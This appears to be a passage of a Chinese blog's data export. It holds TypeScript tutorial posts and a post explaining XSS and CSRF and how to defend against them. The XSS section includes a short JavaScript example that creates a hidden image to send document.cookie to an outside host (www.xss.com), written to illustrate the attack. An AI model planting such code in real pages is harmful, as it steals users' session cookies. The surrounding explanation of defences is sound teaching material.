包的一个依赖。</p>\n<p>在声明文件里包含 <code>/// &lt;reference types=&quot;node&quot; /&gt;</code>，表明这个文件使用了 <code>@types/node/index.d.ts</code> 里面声明的名字； 并且，这个包要在编译阶段与声明文件一起被包含进来。</p>\n<p>解析 <code>@types</code> 包的名字的过程与解析 <code>import</code> 语句里模块名的过程类似。 所以可以简单的把三斜线类型引用指令想像成针对包的 <code>import</code> 声明。</p>\n<p>仅当在你需要写一个 <code>d.ts</code> 文件时才使用这个指令。</p>\n<p>对于那些在编译阶段生成的声明文件，编译器会自动地添加 <code>/// &lt;reference types=&quot;...&quot; /&gt;</code>； 当且仅当结果文件中使用了引用的@types包里的声明时才会在生成的声明文件里添加 <code>/// &lt;reference types=&quot;...&quot; /&gt;</code> 语句。</p>\n<h3 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h3><p>大致看了下，后面的内容都是一些需要记忆的内容，不会牵扯到太多的代码；这里就不再继续往下写了，有想阅读后面内容的朋友可以进入<a href=\"https://www.tslang.cn/index.html\" target=\"_blank\" rel=\"noopener\">Typescript中文文档</a>继续学习。</p>"},{"title":"XSS和CSRF防御","date":"2016-12-13T06:02:51.000Z","_content":"XSS和CSRF(XSRF)都属于跨站攻击，XSS是实现CSRF(XSRF)诸多途径中的一条，但不是唯一一条。\n\n<!-- more -->\n\n### 原理\n\nXSS的本质是让对方浏览器执行你插入的js ，来获取`cookie`等信息；\nCSRF(XSRF)是借用用户的身份，向服务器发送请求。\n\n### XSS的类型\n\n##### 储存型\n\n储存型的XSS代码是储存在服务器端，如在个人信息或发表文章等地方，加入代码，如果没有过滤或过滤不严，那么这些代码将储存到服务器中，用户访问该页面的时候触发代码执行。这种XSS比较危险，容易造成蠕虫，盗窃 `cookie` 等。\n\n##### 反射型\n\n反射型XSS需要欺骗用户自己去点击链接才能触发XSS代码。发出请求时，XSS代码出现在URL中，作为输入提交到服务器端，服务器端解析后响应，XSS代码随响应内容一起传回给浏览器，最后浏览器解析执行XSS。\n\n**Example:**\n\n```js\nvar img = document.createElement('img');\nimg.src = 'http://www.xss.com?cookie=' + document.cookie;\nimg.style.display = 'none';\ndocument.getElementByTagName('body')[0].appendChild(img);\n\n// 这样就能在用户不知道的情况下将用户在该网站的 `cookie` 信息以 `get` 请求的方式发送给另一个地址。\n```\n\n### XSS的防范\n\n客户端校验用户输入信息，只允许输入合法的值，其他一概过滤掉，防止客户端输入恶意的js代码被植入到HTML代码中，使得js代码得以执行。\n\n**Example:**\n\n* 移除用户上传的DOM属性，如 `onerror` 等。\n* 移除用户上传的 `style`节点，`script`节点，`iframe`节点等。\n* 对用户输入的代码标签进行转换(html encode)。\n* 对url中的参数进行过滤。\n* 对动态输出到页面的内容进行HTML编码。\n* 服务端对敏感的 `Cookie` 设置 `httpOnly` 属性，使js脚本不能读取到 `cookie`。\n\n**题外话：**\n目前很多浏览器都会自身对用户的输入进行判断，检测是否存在攻击字符，比如你上述提到的 `script` 标签，这段脚本很明显就是一段XSS攻击，因此浏览器会对这段输入进行处理，不同的浏览器处理方式也不一样。\n\n### CSRF(XSRF)的过程\n\n**Example:**\n\n* 用户小明在你的网站A上面登录了，A返回了一个 `session ID` (使用cookie存储)。\n* 小明的浏览器保持着A网站的登录状态，攻击者小强给小明发送了一个链接地址。\n* 小明打开了地址的时候，这个页面已经自动的对网站a发送了一个请求。\n* 通过使用小明的cookie信息，这样攻击者小强就可以随意更改小明在A上的信息。\n\n### CSRF(XSRF)的防范\n\n* **使用token：** 服务器随机产生 `tooken`，然后以 `tooken为秘钥产生一段密文`，把 `token和密文` 都随 `cookie` 交给前端，前端发起请求时把 `密文和token` 交给后端看 `token` 能不能生成同样的密文，这样即使黑客拿到了 `token` 也无法拿到密文。\n\n* **使用验证码：** 每一个重要的 `post` 提交页面，使用一个验证码，因为第三方网站是无法获得验证码的。\n\n* **检测http的头信息refer：** `Referer` 记录了请求的来源地址，服务器可以验证这个来源地址是否合法。\n\n* **更改请求方式：** 涉及敏感操作的请求改为 `POST` 请求。\n","source":"_posts/XSS和CSRF防御.md","raw":"---\ntitle: XSS和CSRF防御\ndate: 2016-12-13 14:02:51\ntags: \n---\nXSS和CSRF(XSRF)都属于跨站攻击，XSS是实现CSRF(XSRF)诸多途径中的一条，但不是唯一一条。\n\n<!-- more -->\n\n### 原理\n\nXSS的本质是让对方浏览器执行你插入的js ，来获取`cookie`等信息；\nCSRF(XSRF)是借用用户的身份，向服务器发送请求。\n\n### XSS的类型\n\n##### 储存型\n\n储存型的XSS代码是储存在服务器端，如在个人信息或发表文章等地方，加入代码，如果没有过滤或过滤不严，那么这些代码将储存到服务器中，用户访问该页面的时候触发代码执行。这种XSS比较危险，容易造成蠕虫，盗窃 `cookie` 等。\n\n##### 反射型\n\n反射型XSS需要欺骗用户自己去点击链接才能触发XSS代码。发出请求时，XSS代码出现在URL中，作为输入提交到服务器端，服务器端解析后响应，XSS代码随响应内容一起传回给浏览器，最后浏览器解析执行XSS。\n\n**Example:**\n\n```js\nvar img = document.createElement('img');\nimg.src = 'http://www.xss.com?cookie=' + document.cookie;\nimg.style.display = 'none';\ndocument.getElementByTagName('body')[0].appendChild(img);\n\n// 这样就能在用户不知道的情况下将用户在该网站的 `cookie` 信息以 `get` 请求的方式发送给另一个地址。\n```\n\n### XSS的防范\n\n客户端校验用户输入信息，只允许输入合法的值，其他一概过滤掉，防止客户端输入恶意的js代码被植入到HTML代码中，使得js代码得以执行。\n\n**Example:**\n\n* 移除用户上传的DOM属性，如 `onerror` 等。\n* 移除用户上传的 `style`节点，`script`节点，`iframe`节点等。\n* 对用户输入的代码标签进行转换(html encode)。\n* 对url中的参数进行过滤。\n* 对动态输出到页面的内容进行HTML编码。\n* 服务端对敏感的 `Cookie` 设置 `httpOnly` 属性，使js脚本不能读取到 `cookie`。\n\n**题外话：**\n目前很多浏览器都会自身对用户的输入进行判断，检测是否存在攻击字符，比如你上述提到的 `script` 标签，这段脚本很明显就是一段XSS攻击，因此浏览器会对这段输入进行处理，不同的浏览器处理方式也不一样。\n\n### CSRF(XSRF)的过程\n\n**Example:**\n\n* 用户小明在你的网站A上面登录了，A返回了一个 `session ID` (使用cookie存储)。\n* 小明的浏览器保持着A网站的登录状态，攻击者小强给小明发送了一个链接地址。\n* 小明打开了地址的时候，这个页面已经自动的对网站a发送了一个请求。\n* 通过使用小明的cookie信息，这样攻击者小强就可以随意更改小明在A上的信息。\n\n### CSRF(XSRF)的防范\n\n* **使用token：** 服务器随机产生 `tooken`，然后以 `tooken为秘钥产生一段密文`，把 `token和密文` 都随 `cookie` 交给前端，前端发起请求时把 `密文和token` 交给后端看 `token` 能不能生成同样的密文，这样即使黑客拿到了 `token` 也无法拿到密文。\n\n* **使用验证码：** 每一个重要的 `post` 提交页面，使用一个验证码，因为第三方网站是无法获得验证码的。\n\n* **检测http的头信息refer：** `Referer` 记录了请求的来源地址，服务器可以验证这个来源地址是否合法。\n\n* **更改请求方式：** 涉及敏感操作的请求改为 `POST` 请求。\n","slug":"XSS和CSRF防御","published":1,"updated":"2018-10-25T06:05:58.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjno6s7qr000d02vsd13f68lt","content":"<p>XSS和CSRF(XSRF)都属于跨站攻击，XSS是实现CSRF(XSRF)诸多途径中的一条，但不是唯一一条。</p>\n<a id=\"more\"></a>\n<h3 id=\"原理\"><a href=\"#原理\" class=\"headerlink\" title=\"原理\"></a>原理</h3><p>XSS的本质是让对方浏览器执行你插入的js ，来获取<code>cookie</code>等信息；<br>CSRF(XSRF)是借用用户的身份，向服务器发送请求。</p>\n<h3 id=\"XSS的类型\"><a href=\"#XSS的类型\" class=\"headerlink\" title=\"XSS的类型\"></a>XSS的类型</h3><h5 id=\"储存型\"><a href=\"#储存型\" class=\"headerlink\" title=\"储存型\"></a>储存型</h5><p>储存型的XSS代码是储存在服务器端，如在个人信息或发表文章等地方，加入代码，如果没有过滤或过滤不严，那么这些代码将储存到服务器中，用户访问该页面的时候触发代码执行。这种XSS比较危险，容易造成蠕虫，盗窃 <code>cookie</code> 等。</p>\n<h5 id=\"反射型\"><a href=\"#反射型\" class=\"headerlink\" title=\"反射型\"></a>反射型</h5><p>反射型XSS需要欺骗用户自己去点击链接才能触发XSS代码。发出请求时，XSS代码出现在URL中，作为输入提交到服务器端，服务器端解析后响应，XSS代码随响应内容一起传回给浏览器，最后浏览器解析执行XSS。</p>\n<p><strong>Example:</strong></p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> img = <span class=\"built_in\">document</span>.createElement(<span class=\"string\">'img'</span>);</span><br><span class=\"line\">img.src = <span class=\"string\">'http://www.xss.com?cookie='</span> + <span class=\"built_in\">document</span>.cookie;</span><br><span class=\"line\">img.style.display = <span class=\"string\">'none'</span>;</span><br><span class=\"line\"><span class=\"built_in\">document</span>.getElementByTagName(<span class=\"string\">'body'</span>)[<span class=\"number\">0</span>].appendChild(img);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 这样就能在用户不知道的情况下将用户在该网站的 `cookie` 信息以 `get` 请求的方式发送给另一个地址。</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"XSS的防范\"><a href=\"#XSS的防范\" class=\"headerlink\" title=\"XSS的防范\"></a>XSS的防范</h3><p>客户端校验用户输入信息，只允许输入合法的值，其他一概过滤掉，防止客户端输入恶意的js代码被植入到HTML代码中，使得js代码得以执行。</p>\n<p><strong>Example:</strong></p>\n<ul>\n<li>移除用户上传的DOM属性，如 <code>onerror</code> 等。</li>\n<li>移除用户上传的 <code>style</code>节点，<code>script</code>节点，<code>iframe</code>节点等。</li>\n<li>对用户输入的代码标签进行转换(html encode)。</li>\n<li>对url中的参数进行过滤。</li>\n<li>对动态输出到页面的内容进行HTML编码。</li>\n<li>服务端对敏感的 <code>Cookie</code> 设置 <code>httpOnly</code> 属性，使js脚本不能读取到 <code>cookie</code>。</li>\n</ul>\n<p><strong>题外话：</strong><br>目前很多浏览器都会自身对用户的输入进行判断，检测是否存在攻击字符，比如你上述提到的 <code>script</code> 标签，这段脚本很明显就是一段XSS攻击，因此浏览器会对这段输入进行处理，不同的浏览器处理方式也不一样。</p>\n<h3 id=\"CSRF-XSRF-的过程\"><a href=\"#CSRF-XSRF-的过程\" class=\"headerlink\" title=\"CSRF(XSRF)的过程\"></a>CSRF(XSRF)的过程</h3><p><strong>Example:</strong></p>\n<ul>\n<li>用户小明在你的网站A上面登录了，A返回了一个 <code>session ID</code> (使用cookie存储)。</li>\n<li>小明的浏览器保持着A网站的登录状态，攻击者小强给小明发送了一个链接地址。</li>\n<li>小明打开了地址的时候，这个页面已经自动的对网站a发送了一个请求。</li>\n<li>通过使用小明的cookie信息，这样攻击者小强就可以随意更改小明在A上的信息。</li>\n</ul>\n<h3 id=\"CSRF-XSRF-的防范\"><a href=\"#CSRF-XSRF-的防范\" class=\"headerlink\" title=\"CSRF(XSRF)的防范\"></a>CSRF(XSRF)的防范</h3><ul>\n<li><p><strong>使用token：</strong> 服务器随机产生 <code>tooken</code>，然后以 <code>tooken为秘钥产生一段密文</code>，把 <code>token和密文</code> 都随 <code>cookie</code> 交给前端，前端发起请求时把 <code>密文和token</code> 交给后端看 <code>token</code> 能不能生成同样的密文，这样即使黑客拿到了 <code>token</code> 也无法拿到密文。</p>\n</li>\n<li><p><strong>使用验证码：</strong> 每一个重要的 <code>post</code> 提交页面，使用一个验证码，因为第三方网站是无法获得验证码的。</p>\n</li>\n<li><p><strong>检测http的头信息refer：</strong> <code>Referer</code> 记录了请求的来源地址，服务器可以验证这个来源地址是否合法。</p>\n</li>\n<li><p><strong>更改请求方式：</strong> 涉及敏感操作的请求改为 <code>POST</code> 请求。</p>\n</li>\n</ul>\n","site":{"data":{}},"excerpt":"<p>XSS和CSRF(XSRF)都属于跨站攻击，XSS是实现CSRF(XSRF)诸多途径中的一条，但不是唯一一条。</p>","more":"<h3 id=\"原理\"><a href=\"#原理\" class=\"headerlink\" title=\"原理\"></a>原理</h3><p>XSS的本质是让对方浏览器执行你插入的js ，来获取<code>cookie</code>等信息；<br>CSRF(XSRF)是借用用户的身份，向服务器发送请求。</p>\n<h3 id=\"XSS的类型\"><a href=\"#XSS的类型\" class=\"headerlink\" title=\"XSS的类型\"></a>XSS的类型</h3><h5 id=\"储存型\"><a href=\"#储存型\" class=\"headerlink\" title=\"储存型\"></a>储存型</h5><p>储存型的XSS代码是储存在服务器端，如在个人信息或发表文章等地方，加入代码，如果没有过滤或过滤不严，那么这些代码将储存到服务器中，用户访问该页面的时候触发代码执行。这种XSS比较危险，容易造成蠕虫，盗窃 <code>cookie</code> 等。</p>\n<h5 id=\"反射型\"><a href=\"#反射型\" class=\"headerlink\" title=\"反射型\"></a>反射型</h5><p>反射型XSS需要欺骗用户自己去点击链接才能触发XSS代码。发出请求时，XSS代码出现在URL中，作为输入提交到服务器端，服务器端解析后响应，XSS代码随响应内容一起传回给浏览器，最后浏览器解析执行XSS。</p>\n<p><strong>Example:</strong></p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> img = <span class=\"built_in\">document</span>.createElement(<span class=\"string\">'img'</span>);</span><br><span class=\"line\">img.src = <span class=\"string\">'http://www.xss.com?cookie='</span> + <span class=\"built_in\">document</span>.cookie;</span><br><span class=\"line\">img.style.display = <span class=\"string\">'none'</span>;</span><br><span class=\"line\"><span class=\"built_in\">document</span>.getElementByTagName(<span class=\"string\">'body'</span>)[<span class=\"number\">0</span>].appendChild(img);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 这样就能在用户不知道的情况下将用户在该网站的 `cookie` 信息以 `get` 请求的方式发送给另一个地址。</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"XSS的防范\"><a href=\"#XSS的防范\" class=\"headerlink\" title=\"XSS的防范\"></a>XSS的防范</h3><p>客户端校验用户输入信息，只允许输入合法的值，其他一概过滤掉，防止客户端输入恶意的js代码被植入到HTML代码中，使得js代码得以执行。</p>\n<p><strong>Example:</strong></p>\n<ul>\n<li>移除用户上传的DOM属性，如 <code>onerror</code> 等。</li>\n<li>移除用户上传的 <code>style</code>节点，<code>script</code>节点，<code>iframe</code>节点等。</li>\n<li>对用户输入的代码标签进行转换(html encode)。</li>\n<li>对url中的参数进行过滤。</li>\n<li>对动态输出到页面的内容进行HTML编码。</li>\n<li>服务端对敏感的 <code>Cookie</code> 设置 <code>httpOnly</code> 属性，使js脚本不能读取到 <code>cookie</code>。</li>\n</ul>\n<p><strong>题外话：</strong><br>目前很多浏览器都会自身对用户的输入进行判断，检测是否存在攻击字符，比如你上述提到的 <code>script</code> 标签，这段脚本很明显就是一段XSS攻击，因此浏览器会对这段输入进行处理，不同的浏览器处理方式也不一样。</p>\n<h3 id=\"CSRF-XSRF-的过程\"><a href=\"#CSRF-XSRF-的过程\" class=\"headerlink\" title=\"CSRF(XSRF)的过程\"></a>CSRF(XSRF)的过程</h3><p><strong>Example:</strong></p>\n<ul>\n<li>用户小明在你的网站A上面登录了，A返回了一个 <code>session ID</code> (使用cookie存储)。</li>\n<li>小明的浏览器保持着A网站的登录状态，攻击者小强给小明发送了一个链接地址。</li>\n<li>小明打开了地址的时候，这个页面已经自动的对网站a发送了一个请求。</li>\n<li>通过使用小明的cookie信息，这样攻击者小强就可以随意更改小明在A上的信息。</li>\n</ul>\n<h3 id=\"CSRF-XSRF-的防范\"><a href=\"#CSRF-XSRF-的防范\" class=\"headerlink\" title=\"CSRF(XSRF)的防范\"></a>CSRF(XSRF)的防范</h3><ul>\n<li><p><strong>使用token：</strong> 服务器随机产生 <code>tooken</code>，然后以 <code>tooken为秘钥产生一段密文</code>，把 <code>token和密文</code> 都随 <code>cookie</code> 交给前端，前端发起请求时把 <code>密文和token</code> 交给后端看 <code>token</code> 能不能生成同样的密文，这样即使黑客拿到了 <code>token</code> 也无法拿到密文。</p>\n</li>\n<li><p><strong>使用验证码：</strong> 每一个重要的 <code>post</code> 提交页面，使用一个验证码，因为第三方网站是无法获得验证码的。</p>\n</li>\n<li><p><strong>检测http的头信息refer：</strong> <code>Referer</code> 记录了请求的来源地址，服务器可以验证这个来源地址是否合法。</p>\n</li>\n<li><p><strong>更改请求方式：</strong> 涉及敏感操作的请求改为 <code>POST</code> 请求。</p>\n</li>\n</ul>"},{"title":"Typescript学习日记(四)","date":"2017-01-27T03:58:26.000Z","_content":"\n本文将会介绍 `typescript` 中函数的相关内容。\n<!-- more -->\n\n### 函数\n\n#### 函数定义\n\n此处略过。\n\n#### 函数类型\n\n在函数定义的时候我们可以为函数指定 `参数类型` 与 `返回类型`。\n\n ```ts\n // 指定 add 函数接受两个 number 类型的参数x,y，返回一个 number 类型的值\n function add(x: number, y: number) :number {\n     return x + y;\n }\n ```\n\n上面这种写法是 `typescript` 中最常见的函数类型写法，不过这是一种 `简写写法`。\n\n**完整写法：**\n\n```ts\nlet add: \n    //       这是 参数类型 部分         =              这是 返回值类型 部分\n    (x: number, y: number) => number = function (x: number, y: number): number { return x + y }\n    // (baseValue: number, increase: number) => number = function (x: number, y: number): number { return x + y }\n```\n有没有发现原本简单明了的函数表达式变的更加难以理解了?没关系，定义函数的时候还是可以使用 `简写写法`，`typescript` 会自动帮我们转化。\n\n**类型推导**\n非常简单，不再叙述，[详见这里](https://www.tslang.cn/docs/handbook/functions.html)。\n\n\n#### 可选参数与默认参数\n\n看过前面 `interface` 的可选形式，对这里函数的可选形式应该不会陌生，它们的表现形式完全一样。至于默认参数，写过 `es6` 函数语法的应该已经非常熟悉了。\n\n**可选参数**\n```ts\nfunction yourName(firstName: string, lastName?: string): string {\n    if(lastName) {\n        return `${firstName} ${firstName}`;\n    } else {\n        return firstName;\n    }\n}\n\nyourName(); // -> error，最少传入一个参数\nyourName('Carl'); // -> success, 'Carl'\nyourName('Mr.', 'Carl'); // success, 'Mr. Carl'\nyourName('Mr.', 'Carl', 'Jhon'); // error, 参数太多\n```\n\n**默认参数**\n```ts\n// 需要注意的是 参数位置 不能更改\nfunction yourName(firstName: string, lastName = 'Jhon'): string {\n        return `${firstName} ${firstName}`;\n}\n\nyourName(); // -> error，最少传入一个参数\nyourName('Mr.'); // -> success， 'Mr. Jhon'\nyourName('Mr.', undefined); // -> success， 'Mr. Jhon'\nyourName('Mr.', 'Carl'); // -> success， 'Mr. Carl'\n```\n\n#### 剩余参数\n\n剩余参数使用的是 `es6` 的 `rest剩余参数` 语法(没有使用过的人可以点击[这里](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Functions/Rest_parameters)查看)。`typescript` 中的 `剩余参数` 的使用方式和 `es6` 中完全一致。\n\n```ts\nfunction add(x: number, ...restArgs: number[]) {\n    let total = x;\n    restArgs.forEach(item => {\n        total += item\n    })\n\n    return total;\n}\n\nadd(1,2,3,4,5); // -> 15\n```\n\n#### this\n\n关于 `this` 这里不说太多，网上关于它的文章太多了。\n关于使用 `箭头函数` 对 `this` 的影响可以查看我前面写的一片文章[箭头函数](https://thenightelf.github.io/2018/01/03/%E7%AE%AD%E5%A4%B4%E5%87%BD%E6%95%B0/);\n\n\n`typescript` 中对于函数 `this` 的处理放在了参数中进行约束。\n\n```ts\ninterface Card {\n    suit: string;\n    card: number;\n}\ninterface Deck {\n    suits: string[];\n    cards: number[];\n    createCardPicker(this: Deck): () => Card;\n}\n\nlet deck: Deck = {\n    suits: [\"hearts\", \"spades\", \"clubs\", \"diamonds\"],\n    cards: Array(52),\n    // 在参数中约定 this 为 Deck 类型\n    createCardPicker: function(this: Deck) {\n        return () => {\n            let pickedCard = Math.floor(Math.random() * 52);\n            let pickedSuit = Math.floor(pickedCard / 13);\n\n            return {suit: this.suits[pickedSuit], card: pickedCard % 13};\n        }\n    }\n}\n\nlet cardPicker = deck.createCardPicker();\nlet pickedCard = cardPicker();\n\nalert(\"card: \" + pickedCard.card + \" of \" + pickedCard.suit);\n```\n\n#### 函数重载\n\n不同于 `javascript` 的函数重载，`typescript` 中重复的对于一个函数进行定义，只要 `参数与返回值类型` 不同，就不会相互覆盖。\n```ts\n// javascript\nfunction say() {\n    console.log('hi');\n}\n\nfunction say() {\n    console.log('hello');\n}\n\nsay(); // -> hello\n\n// typescript\n// 官方的例子比较直接，这里直接使用官方的例子\nlet suits = [\"hearts\", \"spades\", \"clubs\", \"diamonds\"];\n\n// 对于函数 pickCard 的参数与返回值进行约束\n// 约束参数类型为 {suit: string; card: number; }[] 类型时，返回值类型为 number\nfunction pickCard(x: {suit: string; card: number; }[]): number;\n\n// 约束参数类型为 number 类型时，返回值类型为 {suit: string; card: number; }\nfunction pickCard(x: number): {suit: string; card: number; };\n\n// 主体处理函数\nfunction pickCard(x): any {\n    if (typeof x == \"object\") {\n        let pickedCard = Math.floor(Math.random() * x.length);\n        return pickedCard;\n    }\n    else if (typeof x == \"number\") {\n        let pickedSuit = Math.floor(x / 13);\n        return { suit: suits[pickedSuit], card: x % 13 };\n    }\n}\n\nlet myDeck = [{ suit: \"diamonds\", card: 2 }, { suit: \"spades\", card: 10 }, { suit: \"hearts\", card: 4 }];\nlet pickedCard1 = myDeck[pickCard(myDeck)];\nalert(\"card: \" + pickedCard1.card + \" of \" + pickedCard1.suit);\n\nlet pickedCard2 = pickCard(15);\nalert(\"card: \" + pickedCard2.card + \" of \" + pickedCard2.suit);\n\n\n// -> error，没有一个重载的参数约束为 string\nlet pickedCard3 = pickCard('15');\nalert(\"card: \" + pickedCard3.card + \" of \" + pickedCard3.suit);\n\n```\n\n**这里需要注意的是**：如果通过重载对函数进行约束之后，那么该函数只能接受重载的定义类型。\n\n","source":"_posts/Typescript学习日记（四）.md","raw":"---\ntitle: Typescript学习日记(四)\ndate: 2017-01-27 11:58:26\ntags:\n---\n\n本文将会介绍 `typescript` 中函数的相关内容。\n<!-- more -->\n\n### 函数\n\n#### 函数定义\n\n此处略过。\n\n#### 函数类型\n\n在函数定义的时候我们可以为函数指定 `参数类型` 与 `返回类型`。\n\n ```ts\n // 指定 add 函数接受两个 number 类型的参数x,y，返回一个 number 类型的值\n function add(x: number, y: number) :number {\n     return x + y;\n }\n ```\n\n上面这种写法是 `typescript` 中最常见的函数类型写法，不过这是一种 `简写写法`。\n\n**完整写法：**\n\n```ts\nlet add: \n    //       这是 参数类型 部分         =              这是 返回值类型 部分\n    (x: number, y: number) => number = function (x: number, y: number): number { return x + y }\n    // (baseValue: number, increase: number) => number = function (x: number, y: number): number { return x + y }\n```\n有没有发现原本简单明了的函数表达式变的更加难以理解了?没关系，定义函数的时候还是可以使用 `简写写法`，`typescript` 会自动帮我们转化。\n\n**类型推导**\n非常简单，不再叙述，[详见这里](https://www.tslang.cn/docs/handbook/functions.html)。\n\n\n#### 可选参数与默认参数\n\n看过前面 `interface` 的可选形式，对这里函数的可选形式应该不会陌生，它们的表现形式完全一样。至于默认参数，写过 `es6` 函数语法的应该已经非常熟悉了。\n\n**可选参数**\n```ts\nfunction yourName(firstName: string, lastName?: string): string {\n    if(lastName) {\n        return `${firstName} ${firstName}`;\n    } else {\n        return firstName;\n    }\n}\n\nyourName(); // -> error，最少传入一个参数\nyourName('Carl'); // -> success, 'Carl'\nyourName('Mr.', 'Carl'); // success, 'Mr. Carl'\nyourName('Mr.', 'Carl', 'Jhon'); // error, 参数太多\n```\n\n**默认参数**\n```ts\n// 需要注意的是 参数位置 不能更改\nfunction yourName(firstName: string, lastName = 'Jhon'): string {\n        return `${firstName} ${firstName}`;\n}\n\nyourName(); // -> error，最少传入一个参数\nyourName('Mr.'); // -> success， 'Mr. Jhon'\nyourName('Mr.', undefined); // -> success， 'Mr. Jhon'\nyourName('Mr.', 'Carl'); // -> success， 'Mr. Carl'\n```\n\n#### 剩余参数\n\n剩余参数使用的是 `es6` 的 `rest剩余参数` 语法(没有使用过的人可以点击[这里](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Functions/Rest_parameters)查看)。`typescript` 中的 `剩余参数` 的使用方式和 `es6` 中完全一致。\n\n```ts\nfunction add(x: number, ...restArgs: number[]) {\n    let total = x;\n    restArgs.forEach(item => {\n        total += item\n    })\n\n    return total;\n}\n\nadd(1,2,3,4,5); // -> 15\n```\n\n#### this\n\n关于 `this` 这里不说太多，网上关于它的文章太多了。\n关于使用 `箭头函数` 对 `this` 的影响可以查看我前面写的一片文章[箭头函数](https://thenightelf.github.io/2018/01/03/%E7%AE%AD%E5%A4%B4%E5%87%BD%E6%95%B0/);\n\n\n`typescript` 中对于函数 `this` 的处理放在了参数中进行约束。\n\n```ts\ninterface Card {\n    suit: string;\n    card: number;\n}\ninterface Deck {\n    suits: string[];\n    cards: number[];\n    createCardPicker(this: Deck): () => Card;\n}\n\nlet deck: Deck = {\n    suits: [\"hearts\", \"spades\", \"clubs\", \"diamonds\"],\n    cards: Array(52),\n    // 在参数中约定 this 为 Deck 类型\n    createCardPicker: function(this: Deck) {\n        return () => {\n            let pickedCard = Math.floor(Math.random() * 52);\n            let pickedSuit = Math.floor(pickedCard / 13);\n\n            return {suit: this.suits[pickedSuit], card: pickedCard % 13};\n        }\n    }\n}\n\nlet cardPicker = deck.createCardPicker();\nlet pickedCard = cardPicker();\n\nalert(\"card: \" + pickedCard.card + \" of \" + pickedCard.suit);\n```\n\n#### 函数重载\n\n不同于 `javascript` 的函数重载，`typescript` 中重复的对于一个函数进行定义，只要 `参数与返回值类型` 不同，就不会相互覆盖。\n```ts\n// javascript\nfunction say() {\n    console.log('hi');\n}\n\nfunction say() {\n    console.log('hello');\n}\n\nsay(); // -> hello\n\n// typescript\n// 官方的例子比较直接，这里直接使用官方的例子\nlet suits = [\"hearts\", \"spades\", \"clubs\", \"diamonds\"];\n\n// 对于函数 pickCard 的参数与返回值进行约束\n// 约束参数类型为 {suit: string; card: number; }[] 类型时，返回值类型为 number\nfunction pickCard(x: {suit: string; card: number; }[]): number;\n\n// 约束参数类型为 number 类型时，返回值类型为 {suit: string; card: number; }\nfunction pickCard(x: number): {suit: string; card: number; };\n\n// 主体处理函数\nfunction pickCard(x): any {\n    if (typeof x == \"object\") {\n        let pickedCard = Math.floor(Math.random() * x.length);\n        return pickedCard;\n    }\n    else if (typeof x == \"number\") {\n        let pickedSuit = Math.floor(x / 13);\n        return { suit: suits[pickedSuit], card: x % 13 };\n    }\n}\n\nlet myDeck = [{ suit: \"diamonds\", card: 2 }, { suit: \"spades\", card: 10 }, { suit: \"hearts\", card: 4 }];\nlet pickedCard1 = myDeck[pickCard(myDeck)];\nalert(\"card: \" + pickedCard1.card + \" of \" + pickedCard1.suit);\n\nlet pickedCard2 = pickCard(15);\nalert(\"card: \" + pickedCard2.card + \" of \" + pickedCard2.suit);\n\n\n// -> error，没有一个重载的参数约束为 string\nlet pickedCard3 = pickCard('15');\nalert(\"card: \" + pickedCard3.card + \" of \" + pickedCard3.suit);\n\n```\n\n**这里需要注意的是**：如果通过重载对函数进行约束之后，那么该函数只能接受重载的定义类型。\n\n","slug":"Typescript学习日记（四）","published":1,"updated":"2018-10-25T06:05:58.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjno6s7qs000e02vsps832ane","content":"<p>本文将会介绍 <code>typescript</code> 中函数的相关内容。<br><a id=\"more\"></a></p>\n<h3 id=\"函数\"><a href=\"#函数\" class=\"headerlink\" title=\"函数\"></a>函数</h3><h4 id=\"函数定义\"><a href=\"#函数定义\" class=\"headerlink\" title=\"函数定义\"></a>函数定义</h4><p>此处略过。</p>\n<h4 id=\"函数类型\"><a href=\"#函数类型\" class=\"headerlink\" title=\"函数类型\"></a>函数类型</h4><p>在函数定义的时候我们可以为函数指定 <code>参数类型</code> 与 <code>返回类型</code>。</p>\n <figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 指定 add 函数接受两个 number 类型的参数x,y，返回一个 number 类型的值</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">add</span>(<span class=\"params\">x: <span class=\"built_in\">number</span>, y: <span class=\"built_in\">number</span></span>) :<span class=\"title\">number</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> x + y;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>上面这种写法是 <code>typescript</code> 中最常见的函数类型写法，不过这是一种 <code>简写写法</code>。</p>\n<p><strong>完整写法：</strong></p>\n<figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">let</span> add: </span><br><span class=\"line\">    <span class=\"comment\">//       这是 参数类型 部分         =              这是 返回值类型 部分</span></span><br><span class=\"line\">    (x: <span class=\"built_in\">number</span>, y: <span class=\"built_in\">number</span>) =&gt; <span class=\"built_in\">number</span> = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\">x: <span class=\"built_in\">number</span>, y: <span class=\"built_in\">number</span></span>): <span class=\"title\">number</span> </span>&#123; <span 